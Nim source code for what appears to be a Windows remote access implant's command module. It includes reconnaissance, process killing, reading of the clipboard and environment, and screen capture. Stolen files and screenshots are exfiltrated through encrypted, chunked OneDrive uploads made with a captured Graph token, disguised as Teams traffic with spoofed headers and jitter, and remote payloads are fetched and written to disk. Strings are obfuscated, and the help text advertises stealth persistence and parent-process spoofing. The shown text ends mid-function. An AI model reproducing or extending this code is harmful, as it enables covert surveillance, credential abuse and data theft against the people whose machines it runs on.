import std/[strutils, strformat, base64, uri, json, os, times, random]
import winim/lean   # kernel32, advapi32, user32, gdi32
import winim/extra
import winim/inc/iphlpapi  # GetAdaptersInfo, IP_ADAPTER_INFO
import winhttp
import types
import obfuscation
import crypto
import network

#################################################################

proc readFileWinAPI(path: string): (seq[byte], string) =
  let handle = CreateFileW(
    path.newWideCString,
    GENERIC_READ, FILE_SHARE_READ, nil,
    OPEN_EXISTING, 0, 0
  )
  if handle == INVALID_HANDLE_VALUE:
    return (@[], &"CreateFileW failed: error {GetLastError()}")
  var chunks: seq[byte]
  var buf    = newSeq[byte](65536)
  var nRead: DWORD
  while true:
    let ok = ReadFile(handle, addr buf[0], DWORD(buf.len), addr nRead, nil)
    if not ok.bool or nRead == 0: break
    chunks.add(buf[0 ..< nRead.int])
  CloseHandle(handle)
  return (chunks, "")

#################################################################

proc writeFileWinAPI(path: string; data: seq[byte]): string =
  let handle = CreateFileW(
    path.newWideCString,
    GENERIC_WRITE, 0, nil,
    CREATE_ALWAYS, 0, 0
  )
  if handle == INVALID_HANDLE_VALUE:
    return &"CreateFileW failed: error {GetLastError()}"
  var nWritten: DWORD
  let ok = WriteFile(handle, unsafeAddr data[0], DWORD(data.len), addr nWritten, nil)
  CloseHandle(handle)
  if not ok.bool or nWritten.int != data.len:
    return &"WriteFile error {GetLastError()} (wrote {nWritten}/{data.len})"
  return ""

#################################################################

proc cmdWhoami*(): string =
  ## GetUserNameW.
  var buf: array[256, WCHAR]
  var sz: DWORD = 256
  if GetUserNameW(addr buf[0], addr sz).bool:
    result = $cast[WideCString](addr buf[0])
  else:
    result = &"GetUserNameW failed: {GetLastError()}"

#################################################################

proc cmdHostname*(): string =
  ## GetComputerNameW.
  var buf: array[256, WCHAR]
  var sz: DWORD = 256
  if GetComputerNameW(addr buf[0], addr sz).bool:
    result = $cast[WideCString](addr buf[0])
  else:
    result = &"GetComputerNameW failed: {GetLastError()}"

#################################################################
proc cmdPwd*(): string =
  ##  GetCurrentDirectoryW.
  var buf: array[1024, WCHAR]
  let n = GetCurrentDirectoryW(1024, addr buf[0])
  if n > 0:
    result = $cast[WideCString](addr buf[0])
  else:
    result = &"GetCurrentDirectoryW failed: {GetLastError()}"

#################################################################
proc cmdGetpid*(): string =
  ## Return the current process ID.
  $GetCurrentProcessId()

#################################################################
proc cmdUptime*(): string =
  ## Return system uptime via GetTickCount64.
  let ms      = GetTickCount64()
  let seconds = ms div 1000
  let days    = seconds div 86400
  let hours   = (seconds mod 86400) div 3600
  let mins    = (seconds mod 3600)  div 60
  let secs    = seconds mod 60
  &"{days}d {hours:02}h {mins:02}m {secs:02}s"


#################################################################

proc cmdLs*(path: string = "."): string =
  ## FindFirstFileW / FindNextFileW.
  var wfd: WIN32_FIND_DATAW
  let pattern = (if path == ".": cmdPwd() else: path) & "\\*"
  let handle  = FindFirstFileW(pattern.newWideCString, addr wfd)
  if handle == INVALID_HANDLE_VALUE:
    return &"FindFirstFileW failed (path={path}): error {GetLastError()}"
  var lines: seq[string]
  while true:
    let name = $cast[WideCString](addr wfd.cFileName[0])
    if name != "." and name != "..":
      let isDir  = (wfd.dwFileAttributes and FILE_ATTRIBUTE_DIRECTORY) != 0
      let size   = (wfd.nFileSizeHigh.int64 shl 32) or wfd.nFileSizeLow.int64
      let marker = if isDir: "<DIR>" else: &"{size:>12}"
      lines.add(&"  {marker}  {name}")
    if not FindNextFileW(handle, addr wfd).bool: break
  FindClose(handle)
  if lines.len == 0:
    return "(empty directory)"
  return lines.join("\n")

#################################################################

proc cmdCat*(path: string): string =
  ## CreateFileW + ReadFile.
  let (data, err) = readFileWinAPI(path)
  if err.len > 0: return err
  try:
    result = cast[string](data)
  except:
    result = &"(binary file, {data.len} bytes)"

#################################################################

proc cmdMkdir*(path: string): string =
  ## CreateDirectoryW.
  if CreateDirectoryW(path.newWideCString, nil).bool:
    &"Directory created: {path}"
  else:
    &"CreateDirectoryW failed: error {GetLastError()}"

#################################################################
proc cmdRm*(path: string): string =
  ## DeleteFileW / RemoveDirectoryW.
  if DeleteFileW(path.newWideCString).bool:
    return &"Deleted file: {path}"
  if RemoveDirectoryW(path.newWideCString).bool:
    return &"Deleted directory: {path}"
  &"Delete failed: error {GetLastError()}"

#################################################################

proc cmdMv*(src, dst: string): string =
  ## MoveFileW.
  if MoveFileW(src.newWideCString, dst.newWideCString).bool:
    &"Moved: {src} → {dst}"
  else:
    &"MoveFileW failed: error {GetLastError()}"

#################################################################
proc cmdCp*(src, dst: string): string =
  ## CopyFileW.
  if CopyFileW(src.newWideCString, dst.newWideCString, 0).bool:
    &"Copied: {src} → {dst}"
  else:
    &"CopyFileW failed: error {GetLastError()}"


#################################################################
proc cmdPs*(): string =
  ## CreateToolhelp32Snapshot.
  let snap = CreateToolhelp32Snapshot(TH32CS_SNAPPROCESS, 0)
  if snap == INVALID_HANDLE_VALUE:
    return &"CreateToolhelp32Snapshot failed: {GetLastError()}"
  var pe: PROCESSENTRY32W
  pe.dwSize = DWORD(sizeof(pe))
  var lines = @["PID       PPID      Name"]
  if Process32FirstW(snap, addr pe).bool:
    while true:
      let name = $cast[WideCString](addr pe.szExeFile[0])
      lines.add(&"  {pe.th32ProcessID:<10}{pe.th32ParentProcessID:<10}{name}")
      if not Process32NextW(snap, addr pe).bool: break
  CloseHandle(snap)
  lines.join("\n")


#################################################################

proc cmdKill*(pidStr: string): string =
  ## OpenProcess + TerminateProcess.
  var pid: int
  try: pid = parseInt(pidStr.strip())
  except: return &"Invalid PID: {pidStr}"
  let handle = OpenProcess(PROCESS_TERMINATE, 0, DWORD(pid))
  if handle == 0:
    return &"OpenProcess failed (PID={pid}): error {GetLastError()}"
  let ok = TerminateProcess(handle, 1)
  CloseHandle(handle)
  if ok.bool: &"Process {pid} terminated."
  else: &"TerminateProcess failed: error {GetLastError()}"


#################################################################

proc cmdSysinfo*(): string =
  ## GetVersionExW + GlobalMemoryStatusEx.
  var osvi: OSVERSIONINFOEXW
  osvi.dwOSVersionInfoSize = DWORD(sizeof(osvi))
  discard GetVersionExW(cast[ptr OSVERSIONINFOW](addr osvi))

  var ms: MEMORYSTATUSEX
  ms.dwLength = DWORD(sizeof(ms))
  GlobalMemoryStatusEx(addr ms)

  var si: SYSTEM_INFO
  GetSystemInfo(addr si)

  let totalRam = ms.ullTotalPhys div (1024*1024)
  let freeRam  = ms.ullAvailPhys div (1024*1024)
  let cpuCount = si.dwNumberOfProcessors

  &"OS: Windows {osvi.dwMajorVersion}.{osvi.dwMinorVersion} Build {osvi.dwBuildNumber}\n" &
  &"CPU cores: {cpuCount}\n" &
  &"RAM: {freeRam} MB free / {totalRam} MB total"


#################################################################

proc cmdDrives*(): string =
  ## GetLogicalDriveStringsW + GetDiskFreeSpaceExW.
  var buf: array[512, WCHAR]
  let n = GetLogicalDriveStringsW(512, addr buf[0])
  if n == 0:
    return &"GetLogicalDriveStringsW failed: {GetLastError()}"
  var lines: seq[string]
  var i = 0
  while i < n.int:
    var drive = ""
    while buf[i] != WCHAR(0) and i < n.int:
      drive.add(char(buf[i].int and 0xFF))
      inc i
    inc i   # skip null terminator
    if drive.len == 0: continue
    var freeBytes, totalBytes, totalFreeBytes: ULARGE_INTEGER
    if GetDiskFreeSpaceExW(drive.newWideCString,
                           addr freeBytes, addr totalBytes,
                           addr totalFreeBytes).bool:
      let total = totalBytes.QuadPart div (1024*1024*1024)
      let free  = freeBytes.QuadPart  div (1024*1024*1024)
      lines.add(&"  {drive}  {free} GB free / {total} GB total")
    else:
      lines.add(&"  {drive}  (no access)")
  lines.join("\n")


#################################################################

proc cmdEnv*(): string =
  ## GetEnvironmentStringsW.
  let envBlock = GetEnvironmentStringsW()
  if envBlock == nil:
    return "GetEnvironmentStringsW failed"
  var lines: seq[string]
  var p = cast[ptr WCHAR](envBlock)
  while p[] != WCHAR(0):
    var s = ""
    while p[] != WCHAR(0):
      s.add(char(p[].int and 0xFF))
      p = cast[ptr WCHAR](cast[int](p) + 2)
    p = cast[ptr WCHAR](cast[int](p) + 2)   # skip null terminator
    if s.len > 0 and not s.startsWith("="):
      lines.add(s)
  FreeEnvironmentStringsW(envBlock)
  lines.join("\n")


#################################################################

proc cmdGetenv*(varName: string): string =
  ##  GetEnvironmentVariableW.
  var buf: array[32768, WCHAR]
  let n = GetEnvironmentVariableW(varName.newWideCString, addr buf[0], 32768)
  if n == 0:
    return &"Variable '{varName}' not found (error {GetLastError()})"
  $cast[WideCString](addr buf[0])


#################################################################

proc cmdClipboard*(): string =
  ## OpenClipboard + GetClipboardData.
  if not OpenClipboard(0).bool:
    return &"OpenClipboard failed: {GetLastError()}"
  let handle = GetClipboardData(CF_UNICODETEXT)
  if handle == 0:
    CloseClipboard()
    return "(clipboard is empty or not text)"
  let p = GlobalLock(handle)
  if p == nil:
    CloseClipboard()
    return "GlobalLock failed"
  result = $cast[WideCString](p)
  GlobalUnlock(handle)
  CloseClipboard()


#################################################################

proc cmdIpconfig*(): string =
  ##  GetAdaptersInfo (iphlpapi).
  var bufLen: ULONG = 16384
  var buf = newSeq[byte](bufLen)
  let rc  = GetAdaptersInfo(cast[PIP_ADAPTER_INFO](addr buf[0]), addr bufLen)
  if rc == ERROR_BUFFER_OVERFLOW:
    buf.setLen(bufLen)
    discard GetAdaptersInfo(cast[PIP_ADAPTER_INFO](addr buf[0]), addr bufLen)
  var lines: seq[string]
  var p = cast[PIP_ADAPTER_INFO](addr buf[0])
  while p != nil:
    let name = $cast[cstring](addr p.AdapterName[0])
    let desc = $cast[cstring](addr p.Description[0])
    let ip   = $cast[cstring](addr p.IpAddressList.IpAddress.String[0])
    let mask = $cast[cstring](addr p.IpAddressList.IpMask.String[0])
    let gw   = $cast[cstring](addr p.GatewayList.IpAddress.String[0])
    lines.add(&"  Adapter : {name}")
    lines.add(&"  Desc    : {desc}")
    lines.add(&"  IP      : {ip}  Mask: {mask}  GW: {gw}")
    lines.add("")
    p = p.Next
  lines.join("\n")


#################################################################

proc cmdNetstat*(): string =
  ## GetExtendedTcpTable (iphlpapi).
  var bufLen: DWORD = 65536
  var buf = newSeq[byte](bufLen)
  let rc  = GetExtendedTcpTable(addr buf[0], addr bufLen, 1,
                                 AF_INET, TCP_TABLE_OWNER_PID_ALL, 0)
  if rc != NO_ERROR:
    return &"GetExtendedTcpTable failed: {rc}"
  let table = cast[ptr MIB_TCPTABLE_OWNER_PID](addr buf[0])
  var lines = @["  Local Address        Remote Address       State        PID"]
  for i in 0 ..< table.dwNumEntries.int:
    let row   = table.table[i]
    let lAddr = &"{row.dwLocalAddr and 0xFF}.{(row.dwLocalAddr shr 8) and 0xFF}." &
                &"{(row.dwLocalAddr shr 16) and 0xFF}.{(row.dwLocalAddr shr 24) and 0xFF}"
    let rAddr = &"{row.dwRemoteAddr and 0xFF}.{(row.dwRemoteAddr shr 8) and 0xFF}." &
                &"{(row.dwRemoteAddr shr 16) and 0xFF}.{(row.dwRemoteAddr shr 24) and 0xFF}"
    let lPort = ((row.dwLocalPort and 0xFF) shl 8) or ((row.dwLocalPort shr 8) and 0xFF)
    let rPort = ((row.dwRemotePort and 0xFF) shl 8) or ((row.dwRemotePort shr 8) and 0xFF)
    let state = case row.dwState
      of MIB_TCP_STATE_LISTEN:      "LISTEN"
      of MIB_TCP_STATE_ESTAB:       "ESTABLISHED"
      of MIB_TCP_STATE_TIME_WAIT:   "TIME_WAIT"
      of MIB_TCP_STATE_CLOSE_WAIT:  "CLOSE_WAIT"
      else: $row.dwState
    lines.add(&"  {lAddr}:{lPort:<6}  {rAddr}:{rPort:<6}  {state:<12} {row.dwOwningPid}")
  lines.join("\n")


type
  ICMP_ECHO_REPLY* {.pure.} = object
    Address*:      ULONG
    Status*:       ULONG
    RoundTripTime*: ULONG
    DataSize*:     USHORT
    Reserved*:     USHORT
    Data*:         pointer
    Options*:      IP_OPTION_INFORMATION
    DataSizeReserved*: ULONG
  IP_OPTION_INFORMATION* {.pure.} = object
    Ttl*:      UCHAR
    Tos*:      UCHAR
    Flags*:    UCHAR
    OptionsSize*: UCHAR
    OptionsData*: PUCHAR


#################################################################

proc IcmpCreateFile*(): HANDLE
  {.stdcall, dynlib: "icmp.dll", importc: "IcmpCreateFile".}
proc IcmpCloseHandle*(IcmpHandle: HANDLE): BOOL
  {.stdcall, dynlib: "icmp.dll", importc: "IcmpCloseHandle".}
proc IcmpSendEcho*(IcmpHandle: HANDLE; DestinationAddress: ULONG;
                   RequestData: pointer; RequestSize: WORD;
                   RequestOptions: pointer; ReplyBuffer: pointer;
                   ReplySize: DWORD; Timeout: DWORD): DWORD
  {.stdcall, dynlib: "icmp.dll", importc: "IcmpSendEcho".}

#################################################################

proc cmdPing*(host: string): string =
  ## (icmp.dll / iphlpapi).
  let icmpHandle = IcmpCreateFile()
  if icmpHandle == INVALID_HANDLE_VALUE:
    return &"IcmpCreateFile failed: {GetLastError()}"
  # Resolve hostname to IP
  var hints: ADDRINFOW
  hints.ai_family = AF_INET
  var res: ptr ADDRINFOW
  if GetAddrInfoW(host.newWideCString, nil, addr hints, addr res) != 0:
    discard IcmpCloseHandle(icmpHandle)
    return &"DNS resolution failed for {host}"
  let ip4 = ULONG(cast[ptr sockaddr_in](res.ai_addr).sin_addr.S_addr)
  FreeAddrInfoW(res)

  let payload = "abcdefghijklmnopqrstuvwxyz012345"
  var replyBuf = newSeq[byte](sizeof(ICMP_ECHO_REPLY) + 32 + 8)
  let sent = IcmpSendEcho(icmpHandle, ip4,
                           unsafeAddr payload[0], WORD(payload.len),
                           nil, addr replyBuf[0], DWORD(replyBuf.len), 1000)
  discard IcmpCloseHandle(icmpHandle)
  if sent == 0:
    return &"Ping to {host} failed (timeout or unreachable)"
  let reply = cast[ptr ICMP_ECHO_REPLY](addr replyBuf[0])
  let ipStr  = &"{reply.Address and 0xFF}.{(reply.Address shr 8) and 0xFF}." &
               &"{(reply.Address shr 16) and 0xFF}.{(reply.Address shr 24) and 0xFF}"
  &"Reply from {ipStr}: bytes={reply.DataSize} time={reply.RoundTripTime}ms TTL={reply.Options.Ttl}"


#################################################################

proc cmdDns*(host: string): string =
  ## GetAddrInfoW.
  var hints: ADDRINFOW
  hints.ai_family = AF_UNSPEC
  var res: ptr ADDRINFOW
  if GetAddrInfoW(host.newWideCString, nil, addr hints, addr res) != 0:
    return &"DNS resolution failed for {host}: error {GetLastError()}"
  var lines: seq[string]
  var p = res
  while p != nil:
    if p.ai_family == AF_INET:
      let ip4 = cast[ptr sockaddr_in](p.ai_addr).sin_addr.S_addr
      let s   = &"{ip4 and 0xFF}.{(ip4 shr 8) and 0xFF}.{(ip4 shr 16) and 0xFF}.{(ip4 shr 24) and 0xFF}"
      lines.add(&"  IPv4: {s}")
    elif p.ai_family == AF_INET6:
      lines.add("  IPv6: (present)")
    p = p.ai_next
  FreeAddrInfoW(res)
  if lines.len == 0: return &"No addresses found for {host}"
  lines.join("\n")

#################################################################

proc captureScreenPng*(): seq[byte] =
  let screenDC = GetDC(0)
  if screenDC == 0: return @[]

  let w = GetSystemMetrics(SM_CXSCREEN)
  let h = GetSystemMetrics(SM_CYSCREEN)
  if w <= 0 or h <= 0:
    ReleaseDC(0, screenDC)
    return @[]

  let memDC = CreateCompatibleDC(screenDC)
  let bmp   = CreateCompatibleBitmap(screenDC, w, h)
  let old   = SelectObject(memDC, bmp)

  # Capture screen into bmp (CAPTUREBLT includes DWM-composited windows)
  discard BitBlt(memDC, 0, 0, w, h, screenDC, 0, 0, SRCCOPY or CAPTUREBLT)

  # Use POSITIVE biHeight so GetDIBits returns standard bottom-up pixel order.
  # Negative biHeight is valid only for in-memory DIBs; many BMP decoders
  # (including Windows Photo Viewer) do not support negative height in BMP files
  # and render the image as all-black.
  var bmi: BITMAPINFO
  bmi.bmiHeader.biSize        = DWORD(sizeof(BITMAPINFOHEADER))
  bmi.bmiHeader.biWidth       = w
  bmi.bmiHeader.biHeight      = h   # positive = bottom-up (standard BMP)
  bmi.bmiHeader.biPlanes      = 1
  bmi.bmiHeader.biBitCount    = 32
  bmi.bmiHeader.biCompression = BI_RGB

  var pixels = newSeq[byte](w * h * 4)
  let scanLines = GetDIBits(memDC, bmp, 0, UINT(h), addr pixels[0], addr bmi, DIB_RGB_COLORS)

  # Release GDI resources
  SelectObject(memDC, old)
  DeleteDC(memDC)
  ReleaseDC(0, screenDC)
  DeleteObject(bmp)

  # If GetDIBits returned 0 scan lines the capture failed (e.g. session 0 / no desktop)
  if scanLines == 0: return @[]

  # Build standard BMP file (BITMAPFILEHEADER + BITMAPINFOHEADER + pixel data)
  let pixelDataSize = w * h * 4
  let fileSize      = 14 + 40 + pixelDataSize
  var bmpData = newSeq[byte](fileSize)

  # ── BITMAPFILEHEADER (14 bytes) ──────────────────────────────────────────
  bmpData[0] = 0x42; bmpData[1] = 0x4D   # 'BM' signature
  let fs = fileSize.uint32
  bmpData[2] = byte(fs          and 0xFF)
  bmpData[3] = byte((fs shr 8)  and 0xFF)
  bmpData[4] = byte((fs shr 16) and 0xFF)
  bmpData[5] = byte((fs shr 24) and 0xFF)
  # bytes 6-9: reserved (0)
  bmpData[10] = 54   # pixel data offset = 14 + 40
  # bytes 11-13: high bytes of offset (0)

  # ── BITMAPINFOHEADER (40 bytes, starts at offset 14) ─────────────────────
  bmpData[14] = 40   # biSize = 40
  # biWidth (4 bytes, little-endian)
  let bw = w.uint32
  bmpData[18] = byte(bw          and 0xFF)
  bmpData[19] = byte((bw shr 8)  and 0xFF)
  bmpData[20] = byte((bw shr 16) and 0xFF)
  bmpData[21] = byte((bw shr 24) and 0xFF)
  # biHeight (4 bytes, positive = bottom-up standard BMP)
  let bh = h.uint32
  bmpData[22] = byte(bh          and 0xFF)
  bmpData[23] = byte((bh shr 8)  and 0xFF)
  bmpData[24] = byte((bh shr 16) and 0xFF)
  bmpData[25] = byte((bh shr 24) and 0xFF)
  bmpData[26] = 1    # biPlanes
  bmpData[28] = 32   # biBitCount (32 bpp BGRA)
  # biCompression = BI_RGB (0) — already 0 from newSeq
  # biSizeImage, biXPelsPerMeter, biYPelsPerMeter, biClrUsed, biClrImportant — all 0

  # ── Pixel data ────────────────────────────────────────────────────────────
  copyMem(addr bmpData[54], addr pixels[0], pixelDataSize)
  return bmpData

#################################################################


#################################################################


const INLINE_THRESHOLD = 10 * 1024
const PART_SIZE        = 3 * 1024 * 1024


const JITTER_MIN_MS = 800
const JITTER_MAX_MS = 2500

proc uploadPartToOneDrive(partData: seq[byte]; partName: string;
                           tokens: var TokenDict): string =

  let fileExt     = s("BIN")
  let encodedName = encodeUrl(partName)
  let mimeType    = s("application/octet-stream")
  let commonHeaders = @[
    (s("Authorization"), s("Bearer ") & tokens.graphToken),
    (s("Osname"),        s("Windows")),
    (s("Scenariotype"),  s("AUO")),
    (s("Scenario"),      s("UploadFile_TeamsMSAFile")),
    (s("Fileextension"), fileExt),
    (s("Accept"),        s("*/*")),
    (s("Origin"),        s("https://teams.live.com")),
    (s("Referer"),       s("https://teams.live.com/")),
    (s("User-Agent"),    USER_AGENT()),
  ]

  let putUrl = (
    s("https://graph.microsoft.com/v1.0/me/drive/root:") &
    s("/Microsoft%20Teams%20Chat%20Files/") & encodedName &
    s(":/content?@microsoft.graph.conflictBehavior=replace") &
    s("&select=id,%40microsoft.graph.downloadUrl,name,size")
  )
  var meta: JsonNode
  try:
    let rPut = apiCall(s("PUT"), putUrl, tokens,commonHeaders & @[(s("Content-Type"), mimeType)],cast[string](partData))
    if rPut.code in [200, 201]:
      meta = parseJson(rPut.body)
  except: discard
  if meta == nil: return ""

  let dlUrl = meta.getOrDefault(s("@microsoft.graph.downloadUrl")).getStr()
  return dlUrl


proc cmdDownload*(path: string; tokens: var TokenDict; threadId: string): string =
  let (rawData, readErr) = readFileWinAPI(path)
  if readErr.len > 0: return readErr

  let filename = extractFilename(path)


  if rawData.len <= INLINE_THRESHOLD or tokens.graphToken.len == 0:
    return s("[DOWNLOAD ") & filename & s(" ") & encode(rawData) & s("]")


  let encrypted = encryptFile(rawData)
  let totalSize = encrypted.len
  let ts        = now().format("yyyyMMdd'_'HHmmss")

  let totalParts = (totalSize + PART_SIZE - 1) div PART_SIZE

  let startMsg = OUT_START() & s("[DOWNLOAD_START ") & filename &
                 s(" ") & $totalParts & s("]") & OUT_END()
  try:
    sendRaw(threadId, startMsg, tokens)
  except: discard


  sleep(2000)

  var rng     = initRand(getTime().toUnix())
  var dlUrls: seq[string]
  var partIdx = 0
  var offset  = 0

  while offset < totalSize:
    let endIdx   = min(offset + PART_SIZE - 1, totalSize - 1)
    let partData = encrypted[offset .. endIdx]

    let partName = filename & s(".") & ts & s(".part") & $partIdx

    let dlUrl = uploadPartToOneDrive(partData, partName, tokens)
    if dlUrl.len == 0:

      return s("[DOWNLOAD ") & filename & s(" ") & encode(rawData) & s("]")

    dlUrls.add(dlUrl)
    inc partIdx
    offset = endIdx + 1


    if offset < totalSize:
      let jitterMs = rng.rand(JITTER_MIN_MS .. JITTER_MAX_MS)
      sleep(jitterMs)

  let partsMsg = s("[DOWNLOAD_PARTS ") & filename & s(" ") & $dlUrls.len &
                 s(" ") & dlUrls.join(s(" ")) & s("]")
  return partsMsg

#################################################################

proc cmdDownloadUrl*(filename, shareId: string; tokens: var TokenDict;
                     destPath: string = ""): string =

  let safeName  = extractFilename(filename)
  let writePath = if destPath.len > 0: destPath else: getCurrentDir() / safeName

  if tokens.graphToken.len == 0:
    return s("no_graph_token")

  try:
    # Step 1
    let encodedSid = encodeUrl(shareId)
    let rShare = httpRequest(s("GET"),
      s("https://graph.microsoft.com/v1.0/shares/") & encodedSid & s("/driveItem") &
      s("?select=restricted,webDavUrl,%40microsoft.graph.downloadUrl,file,name"),
      headers = @[
        (s("Authorization"), s("Bearer ") & tokens.graphToken),
        (s("Prefer"),        s("redeemSharingLink,getShortLivedDownloadUrl")),
        (s("Scenariotype"),  s("AUO")),
        (s("Scenario"),      s("DownloadFile_TeamsMSAUser")),
        (s("Osname"),        s("Windows")),
        (s("Accept"),        s("*/*")),
        (s("Origin"),        s("https://teams.live.com")),
        (s("Referer"),       s("https://teams.live.com/")),
        (s("User-Agent"),    USER_AGENT()),
      ],
    )
    if rShare.code != 200:
      return s("share_resolve_fail: ") & $rShare.code
    let dlUrl = parseJson(rShare.body)
                  .getOrDefault(s("@microsoft.graph.downloadUrl")).getStr()
    if dlUrl.len == 0:
      return s("no_dl_url")

    # Step 2
    let dlHeaders = @[
      (s("User-Agent"), USER_AGENT()),
      (s("Accept"),     s("*/*")),
      (s("Referer"),    s("https://teams.live.com/")),
    ]
    var rDl = httpRequest(s("GET"), dlUrl, headers = dlHeaders)


    if rDl.code != 200 or rDl.body.len == 0:
      rDl = httpRequest(s("POST"), dlUrl,
        headers = dlHeaders & @[(s("Content-Length"), s("0"))],
        body = "",
      )

    if rDl.code != 200 or rDl.body.len == 0:
      return s("file_fetch_fail: ") & $rDl.code


    var raw: seq[byte]
    try:
      raw = decryptFile(cast[seq[byte]](rDl.body))
    except CryptoError:
      return s("decrypt_fail")


    let writeErr = writeFileWinAPI(writePath, raw)
    if writeErr.len > 0: return writeErr
    s("[OK] ") & writePath & s(" (") & $raw.len & s(" bytes)")

  except Exception as e:
    return s("dl_url_fail: ") & e.msg

#################################################################

proc cmdScreenshot*(tokens: var TokenDict; threadId: string): string =
  ## Capture the primary screen and deliver it to the Server.
  ## Reuses the same OneDrive multi-part upload path as cmdDownload
  ## so the Server handles it identically (DOWNLOAD_START / DOWNLOAD_PARTS).
  let bmpData = captureScreenPng()
  if bmpData.len == 0:
    return s("[ERR] Screenshot capture failed")

  let ts       = now().format("yyyyMMdd'_'HHmmss")
  let filename = s("screenshot_") & ts & s(".bmp")

  # Small screenshot or no graph token → inline base64 (rare case)
  if bmpData.len <= INLINE_THRESHOLD or tokens.graphToken.len == 0:
    return s("[DOWNLOAD ") & filename & s(" ") & encode(bmpData) & s("]")

  # Large screenshot → encrypt + multi-part OneDrive upload (same as cmdDownload)
  let encrypted  = encryptFile(bmpData)
  let totalSize  = encrypted.len
  let totalParts = (totalSize + PART_SIZE - 1) div PART_SIZE

  # Handshake: tell Server how many parts to expect
  let startMsg = OUT_START() & s("[DOWNLOAD_START ") & filename &
                 s(" ") & $totalParts & s("]") & OUT_END()
  try: sendRaw(threadId, startMsg, tokens)
  except: discard
  sleep(2000)

  var rng     = initRand(getTime().toUnix())
  var dlUrls: seq[string]
  var partIdx = 0
  var offset  = 0

  while offset < totalSize:
    let endIdx   = min(offset + PART_SIZE - 1, totalSize - 1)
    let partData = encrypted[offset .. endIdx]
    let partName = filename & s(".") & ts & s(".part") & $partIdx

    let dlUrl = uploadPartToOneDrive(partData, partName, tokens)
    if dlUrl.len == 0:
      # Upload failed → fallback to inline base64
      return s("[DOWNLOAD ") & filename & s(" ") & encode(bmpData) & s("]")

    dlUrls.add(dlUrl)
    inc partIdx
    offset = endIdx + 1

    if offset < totalSize:
      sleep(rng.rand(JITTER_MIN_MS .. JITTER_MAX_MS))

  return s("[DOWNLOAD_PARTS ") & filename & s(" ") & $dlUrls.len &
         s(" ") & dlUrls.join(s(" ")) & s("]")


#################################################################

proc cmdReceiveUpload*(filename, b64Data: string; destPath: string = ""): string =

  let writePath = if destPath.len > 0: destPath
                  else: getCurrentDir() / extractFilename(filename)
  var raw: seq[byte]
  try:
    raw = cast[seq[byte]](decode(b64Data))
  except:
    return s("Base64 decode failed")
  let writeErr = writeFileWinAPI(writePath, raw)
  if writeErr.len > 0: return writeErr
  s("File saved: ") & writePath & s(" (") & $raw.len & s(" bytes)")

#################################################################


#################################################################

proc cmdDownloadFrom*(filename, downloadUrl: string;
                      destPath: string = ""): string =
  let safeName  = extractFilename(filename)
  let writePath = if destPath.len > 0: destPath
                  else: getCurrentDir() / safeName

  # Step 1: GET the file from the direct URL
  let dlHeaders = @[
    (s("User-Agent"), USER_AGENT()),
    (s("Accept"),     s("*/*")),
  ]

  var rDl = httpRequest(s("GET"), downloadUrl, headers = dlHeaders)

  # Fallback to POST if GET is blocked (Netscope / proxy)
  if rDl.code != 200 or rDl.body.len == 0:
    rDl = httpRequest(s("POST"), downloadUrl,
      headers = dlHeaders & @[(s("Content-Length"), s("0"))],
      body = "",
    )

  if rDl.code != 200 or rDl.body.len == 0:
    return s("[ERR] downloadfrom_fetch_fail: HTTP ") & $rDl.code

  # Step 2: Decrypt AES-256-GCM
  var raw: seq[byte]
  try:
    raw = decryptFile(cast[seq[byte]](rDl.body))
  except CryptoError:
    return s("[ERR] downloadfrom_decrypt_fail")

  # Step 3: Write to disk via WinAPI
  let writeErr = writeFileWinAPI(writePath, raw)
  if writeErr.len > 0:
    return s("[ERR] ") & writeErr

  s("[OK] ") & writePath & s(" (") & $raw.len & s(" bytes)")

proc cmdReceiveWopiUpload*(filename, downloadUrl: string;
                           destPath: string = ""): string =
  ## Downloads an AES-256-GCM encrypted file from a OneNote WOPI
  ## GetImage.ashx URL (no authentication required) and saves it to disk.
  ##
  ## Parameters:
  ##   filename    - original filename (used as fallback save path)
  ##   downloadUrl - full GetImage.ashx URL returned by the Server
  ##   destPath    - optional destination path on disk;
  ##                 defaults to current directory + filename

  let safeName  = extractFilename(filename)
  let writePath = if destPath.len > 0: destPath
                  else: getCurrentDir() / safeName

  # Step 1: GET the file from the unauthenticated OneNote WOPI URL.
  # No auth headers needed — the access_token is embedded in the URL itself.
  let dlHeaders = @[
    (s("User-Agent"), USER_AGENT()),
    (s("Accept"),     s("*/*")),
    (s("Referer"),    s("https://onenote.officeapps.live.com/")),
  ]

  var rDl = httpRequest(s("GET"), downloadUrl, headers = dlHeaders)

  # Fallback to POST if GET is blocked (Netscope / proxy)
  if rDl.code != 200 or rDl.body.len == 0:
    rDl = httpRequest(s("POST"), downloadUrl,
      headers = dlHeaders & @[(s("Content-Length"), s("0"))],
      body = "",
    )

  if rDl.code != 200 or rDl.body.len == 0:
    return s("[ERR] wopi_fetch_fail: HTTP ") & $rDl.code

  # Step 2: Decrypt AES-256-GCM
  var raw: seq[byte]
  try:
    raw = decryptFile(cast[seq[byte]](rDl.body))
  except CryptoError:
    return s("[ERR] wopi_decrypt_fail")

  # Step 3: Write to disk via WinAPI
  let writeErr = writeFileWinAPI(writePath, raw)
  if writeErr.len > 0:
    return s("[ERR] ") & writeErr

  s("[OK] ") & writePath & s(" (") & $raw.len & s(" bytes)")

proc cmdHelp*(): string =
  """Available commands:
  whoami              Current username
  hostname            Computer name
  pwd                 Current directory
  getpid              Current process ID
  uptime              System uptime
  ls [path]           List directory (default: current dir)
  cat <path>          Read file contents
  ps                  List running processes
  kill <pid>          Terminate process by PID
  sysinfo             OS + CPU + RAM info
  drives              Logical drives + disk space
  env                 All environment variables
  getenv <var>        Single environment variable
  mkdir <path>        Create directory
  rm <path>           Delete file or directory
  mv <src> <dst>      Move/rename file
  cp <src> <dst>      Copy file
  clipboard           Read clipboard text
  ipconfig            Network adapter info
  netstat             Active TCP connections
  ping <host>         Ping host (IcmpSendEcho)
  dns <host>          DNS resolution
  screenshot          Capture screen (BMP → OneDrive → URL sent to Server)
  download <path>     Send file to Server (via OneDrive)
  upload <src> [dst]  Receive file from Server (dst = optional destination path)
  isadmin             Check if running as Administrator
  privs               List current process token privileges
  persist <name>      Install stealth scheduled task persistence
  unpersist <name>    Remove scheduled task persistence
  exec <cmdline>      Run EXE via CreateProcessW + pipe (no cmd.exe)
  exec_spoof <cmd> [parent]
                      Run EXE with PPID spoofing (default parent: explorer.exe)
  help                This help text"""


#################################################################
# exec / exec_spoof
#################################################################

proc cmdExec*(cmdLine: string): string =
  if cmdLine.len == 0:
    return s("[EXEC] Usage: exec <cmdline>")

  var sa: SECURITY_ATTRIBUTES
